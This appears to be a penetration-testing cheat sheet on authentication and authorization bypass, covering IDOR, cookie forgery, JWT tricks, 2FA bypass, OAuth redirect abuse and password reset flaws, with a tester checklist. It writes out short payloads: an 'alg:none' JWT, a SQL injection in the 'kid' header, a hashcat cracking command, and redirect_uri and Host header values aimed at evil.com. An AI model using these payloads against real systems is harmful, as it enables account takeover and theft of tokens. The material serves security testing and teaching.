# Authentication & Authorization Bypass

## Categories

1. Broken access control (IDOR / privilege escalation)
2. Cookie/token manipulation
3. 2FA bypass
4. OAuth / SSO vulnerabilities
5. Password reset flaws

---

## Broken Access Control

### Pattern: UI hides action, server doesn't check

```
# Google Gruyere pattern:
# Template hides "admin" button for non-admins
# But endpoint accepts is_admin=True from anyone:
POST /saveprofile?action=update&is_admin=True&uid=victim

# Rule: every state-changing endpoint must check auth server-side
# Never rely on client-side hiding / disabled UI elements
```

### IDOR (Insecure Direct Object Reference)

```
# Change your ID to another user's ID:
GET /api/users/1234/profile   → your profile
GET /api/users/1235/profile   → someone else's profile?

# Test: replace numeric IDs, UUIDs, slugs
# Horizontal: access peer resources (same privilege)
# Vertical: access higher-privilege resources

# Common locations:
/api/orders/{id}
/api/invoices/{id}
/files/{filename}
/admin/users/{id}/reset-password
```

---

## Cookie / Token Manipulation

### Weak hash (Google Gruyere pattern)

```
# Cookie format: hash|username|admin_flag|author_flag
# Hash uses non-cryptographic function

# Attack 1: Forge admin cookie
# Register as "normaluser|admin|author" → cookie grants admin to "normaluser"

# Attack 2: Collision attack
# Python's hash() processes left-to-right → manipulate prefix

# What to check:
1. Is the hash HMAC-SHA256? Or MD5/SHA1/Python hash()?
2. Can username contain | separators?
3. Are cookies signed or just hashed?
4. Is there an expiry timestamp?
5. Can cookies be replayed (no nonce/timestamp)?
```

### JWT Attacks

```
# Algorithm confusion: change alg to none
{"alg":"none","typ":"JWT"}

# RS256 → HS256 confusion: use public key as HMAC secret
# Weak secret: bruteforce with hashcat
hashcat -a 0 -m 16500 <jwt> /wordlist/rockyou.txt

# kid injection (SQL)
{"kid": "' UNION SELECT 'attacker_secret' --"}

# JKU/X5U header injection: point to attacker-controlled key
```

---

## 2FA Bypass

```
1. Response manipulation: intercept 2FA check response, change false → true
2. Code reuse: 2FA codes don't expire / can be reused
3. Brute force: no rate limiting on 2FA endpoint
4. Skip step: go directly to post-2FA URL without completing 2FA
5. Backup codes: backup codes weaker than primary 2FA
6. Race condition: submit same code twice simultaneously
7. Password reset bypasses 2FA: reset password → logged in without 2FA
```

---

## OAuth Vulnerabilities

```
# State parameter missing → CSRF on OAuth flow
# Redirect URI not validated:
redirect_uri=https://evil.com        ← redirects token to attacker
redirect_uri=https://legit.com@evil.com
redirect_uri=https://legit.com.evil.com

# Code reuse: authorization code can be used twice
# Token leakage via Referer: access_token in URL → logged in Referer headers

# Account linking attack:
1. Attacker links victim's OAuth account to attacker's app account
2. When victim logs in via OAuth → attacker gains access
```

---

## Password Reset Flaws

```
1. Guessable token: token based on email + timestamp (MD5)
2. Token not invalidated after use
3. Token not invalidated after password change
4. Token in URL → leaks via Referer
5. Host header injection in reset email:
   Host: evil.com → reset link goes to evil.com
6. Long token lifetime (days instead of hours)
7. User enumeration: different error for existing vs non-existing accounts
```

---

## Checklist

- [ ] Can you access resources by changing IDs?
- [ ] Does admin panel have any endpoint accessible without admin role?
- [ ] Can you bypass 2FA by skipping steps?
- [ ] Is JWT algorithm validated?
- [ ] Does password reset token expire?
- [ ] Are cookies signed with HMAC or weak hash?

---

## Writeup References

- OAuth account takeover: https://medium.com/@logicbomb_1/chain-of-hacks-leading-to-database-compromise-b2bc2b883915
- 2FA bypass: https://medium.com/@iSecMax/two-factor-authentication-bypass-2fa-1ac3d50fb3ee
- JWT none algorithm: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- IDOR leads to data breach: https://medium.com/@saamux/how-i-found-my-first-vulnerability-insecure-direct-object-reference-5bf4f6f3de83
